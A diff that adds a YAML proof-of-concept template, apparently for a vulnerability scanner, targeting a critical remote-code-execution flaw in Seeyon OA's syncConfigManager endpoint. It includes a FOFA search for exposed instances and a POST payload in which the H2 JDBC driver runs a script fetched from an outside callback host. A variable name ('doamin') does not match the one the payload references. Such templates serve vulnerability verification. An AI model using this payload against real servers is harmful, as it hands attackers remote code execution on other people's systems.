@@ -1,0 +1,25 @@
+id: poc-yaml-seeyon-synaconfigmanager-rce
+info:
+  name: 致远OA syncConfigManager 方法存在远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  - 两高一弱
+  finger: 致远互联-OA
+  fofa: title="致远A8-V5协同管理软件 V6.1sp1"
+variables:
+  reverse: new_dns_log()
+  doamin: reverse.Domain()
+requests:
+- method: POST
+  path: /seeyon/ajax.do?method=ajaxAction&managerName=syncConfigManager
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: managerMethod=checkIsCreate&arguments=["","org.h2.Driver","jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT%20FROM%20'http://{{.domain}}'","a","","",""]
+  expression: 'status_code == 200 &&
+
+    reverse.Sleep(3)
+
+    '
+transport: http
